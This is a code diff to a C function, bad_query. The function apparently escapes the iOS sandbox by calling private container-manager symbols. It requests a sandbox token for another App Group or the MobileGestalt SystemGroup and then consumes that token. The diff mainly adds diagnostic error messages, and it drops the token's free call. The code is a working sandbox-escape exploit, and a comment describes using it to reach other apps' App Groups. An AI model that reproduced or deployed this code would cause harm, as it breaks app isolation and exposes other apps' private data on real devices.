@@ -18,6 +18,21 @@
 #include <sys/mount.h>
 #include <sys/fsgetpath.h>
 
+static char bad_query_error[512];
+
+static void bad_query_set_error(const char *message) {
+    snprintf(bad_query_error, sizeof(bad_query_error), "%s", message ? message : "unknown error");
+}
+
+static void bad_query_set_errno_error(const char *stage) {
+    int saved_errno = errno;
+    snprintf(bad_query_error, sizeof(bad_query_error), "%s: errno=%d (%s)",
+             stage, saved_errno, strerror(saved_errno));
+}
+
+const char *bad_query_last_error(void) {
+    return bad_query_error[0] ? bad_query_error : "no diagnostic available";
+}
 typedef void *(*container_query_create_fn)(void);
 typedef void (*container_query_set_class_fn)(void *, uint64_t);
 typedef void (*container_query_set_identifiers_fn)(void *, xpc_object_t);
@@ -31,16 +46,38 @@ typedef int64_t (*sandbox_extension_consume_fn)(const char *);
 typedef int (*sandbox_extension_release_fn)(int64_t);
 
 int64_t bad_query(char* path, bool create, char *group_identifier, bool is_group) {
+    bad_query_set_error("starting query");
+
     // Sanity check our path and check if something already exists there
-    if (!path || path[0] != '/') return -255; // Not an absolute path
+    if (!path) {
+        bad_query_set_error("path is NULL");
+        return -255;
+    }
+    if (path[0] != '/') {
+        bad_query_set_error("path is not absolute");
+        return -255;
+    }
     if (!create) {
         struct stat st;
-        if (lstat(path, &st) != 0) return -254; // File is missing, so we'll return
+        if (lstat(path, &st) != 0) {
+            bad_query_set_errno_error("lstat failed");
+            return -254;
+        }
+        snprintf(bad_query_error, sizeof(bad_query_error),
+                 "path exists (mode=0%o, uid=%u, gid=%u)",
+                 st.st_mode, st.st_uid, st.st_gid);
     }
+    fprintf(stderr, "bad_query: path=%s create=%s group=%s is_group=%s\n",
+            path, create ? "true" : "false",
+            group_identifier ? group_identifier : "none",
+            is_group ? "true" : "false");
     
     // Now the fun begins
     void *mgr = dlopen("/usr/lib/system/libsystem_containermanager.dylib", RTLD_NOW | RTLD_LOCAL);
-    if (!mgr) return -1; // Failed to dlopen
+    if (!mgr) {
+        snprintf(bad_query_error, sizeof(bad_query_error), "dlopen failed: %s", dlerror());
+        return -1;
+    }
     
     // Resolve functions
     container_query_create_fn query_create = (container_query_create_fn)dlsym(mgr, "container_query_create");
@@ -56,16 +93,20 @@ int64_t bad_query(char* path, bool create, char *group_identifier, bool is_group
     
     int64_t handle = -1;
     if (!query_create || !query_set_class || !query_set_group_identifiers || !query_set_flags || !query_set_part || !query_set_part_domain || !query_get_single_result || !query_free || !copy_sandbox_token || !consume_extension) {
+        bad_query_set_error("one or more required symbols were not resolved");
         dlclose(mgr);
-        return -1; // Failed to resolve a function
+        return -1;
     }
+    bad_query_set_error("all required symbols resolved");
     
     // Create query
     void *query = query_create();
     if (!query) {
+        bad_query_set_error("container_query_create returned NULL");
         dlclose(mgr);
-        return -2; // Failed to create query
+        return -2;
     }
+    bad_query_set_error("query object created");
     
     // Set up query
     // Two routes here, supply an App Group you control (to access other App Groups on iOS 26) or don't, and use MobileGestalt's SystemGroup as a target instead. If targeting iOS 26 and trying to access App Groups, also set is_group to true to use the correct flags.
@@ -102,16 +143,17 @@ int64_t bad_query(char* path, bool create, char *group_identifier, bool is_group
         }
     }
     
-    // To access App Groups on iOS 26, you have to use different flags, this doesn't apply on 27
-    if (is_group) {
-        query_set_flags(query, 0x0000000800000000ULL);
-    } else {
-        query_set_flags(query, 0x0000008000000000ULL);
-    }
+    query_set_flags(query, is_group ? 0x0000000800000000ULL : 0x0000008000000000ULL);
+    snprintf(bad_query_error, sizeof(bad_query_error),
+             "query configured: class=%llu part=3 flags=0x%016llx domain=%s",
+             group_identifier ? 7ULL : 13ULL,
+             is_group ? 0x0000000800000000ULL : 0x0000008000000000ULL,
+             part);
     
     // Send our query over
     void *result = query_get_single_result(query);
     if (!result) {
+        bad_query_set_error("container_query_get_single_result returned NULL");
         free(part);
         xpc_release(identifier);
         query_free(query);
@@ -120,6 +162,7 @@ int64_t bad_query(char* path, bool create, char *group_identifier, bool is_group
     }
     char *token = copy_sandbox_token(result);
     if (!token) {
+        bad_query_set_error("container_copy_sandbox_token returned NULL; token was not issued");
         free(part);
         xpc_release(identifier);
         query_free(query);
@@ -129,7 +172,13 @@ int64_t bad_query(char* path, bool create, char *group_identifier, bool is_group
     
     // Consume our fresh sandbox extension and clean up
     handle = consume_extension(token);
-    free(token);
+    if (handle < 0) {
+        snprintf(bad_query_error, sizeof(bad_query_error),
+                 "sandbox_extension_consume failed: handle=%lld", handle);
+    } else {
+        snprintf(bad_query_error, sizeof(bad_query_error),
+                 "sandbox extension consumed: handle=%lld", handle);
+    }
     free(part);
     xpc_release(identifier);
     query_free(query);
